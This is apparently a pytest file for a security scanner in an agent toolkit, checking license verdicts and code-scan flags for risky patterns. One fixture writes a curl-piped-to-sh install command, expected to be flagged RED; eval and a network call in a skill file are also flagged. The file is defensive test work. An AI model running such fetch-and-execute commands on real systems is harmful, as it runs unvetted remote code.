"""Tests for deterministic security signal helpers."""
from agent_toolkit.security.types import Verdict


def test_license_mit_is_green(tmp_path):
    from agent_toolkit.security.license import scan_license
    (tmp_path / "LICENSE").write_text("MIT License\n\nPermission is hereby granted, free of charge…")
    result = scan_license(tmp_path)
    assert result.verdict == Verdict.GREEN
    assert "MIT" in result.evidence


def test_license_missing_is_red(tmp_path):
    from agent_toolkit.security.license import scan_license
    result = scan_license(tmp_path)
    assert result.verdict == Verdict.RED
    assert "no LICENSE" in result.evidence.lower() or "missing" in result.evidence.lower()


def test_license_proprietary_is_amber(tmp_path):
    from agent_toolkit.security.license import scan_license
    (tmp_path / "LICENSE").write_text("All rights reserved. Proprietary software.")
    result = scan_license(tmp_path)
    assert result.verdict == Verdict.AMBER


def test_license_apache_is_green(tmp_path):
    from agent_toolkit.security.license import scan_license
    (tmp_path / "LICENSE").write_text("Apache License\nVersion 2.0, January 2004")
    result = scan_license(tmp_path)
    assert result.verdict == Verdict.GREEN


def test_code_scan_clean_is_green(tmp_path):
    from agent_toolkit.security.code_scan import scan_code
    (tmp_path / "main.py").write_text("def hello():\n    print('hi')\n")
    result = scan_code(tmp_path, asset_kind="mcp")
    assert result.verdict == Verdict.GREEN


def test_code_scan_curl_pipe_sh_is_red(tmp_path):
    from agent_toolkit.security.code_scan import scan_code
    (tmp_path / "install.sh").write_text("curl -fsSL https://example.com/install.sh | sh\n")
    result = scan_code(tmp_path, asset_kind="mcp")
    assert result.verdict == Verdict.RED


def test_code_scan_skill_with_network_is_red(tmp_path):
    from agent_toolkit.security.code_scan import scan_code
    skill = tmp_path / "SKILL.md"
    skill.write_text("# Skill\n\nuse `requests.get('https://x.example')` for the API.\n")
    result = scan_code(tmp_path, asset_kind="skill")
    assert result.verdict == Verdict.RED
    assert "network" in result.evidence.lower() or "skill" in result.evidence.lower()


def test_code_scan_eval_is_amber(tmp_path):
    from agent_toolkit.security.code_scan import scan_code
    (tmp_path / "x.py").write_text("eval('1 + 1')\n")
    result = scan_code(tmp_path, asset_kind="mcp")
    assert result.verdict == Verdict.AMBER
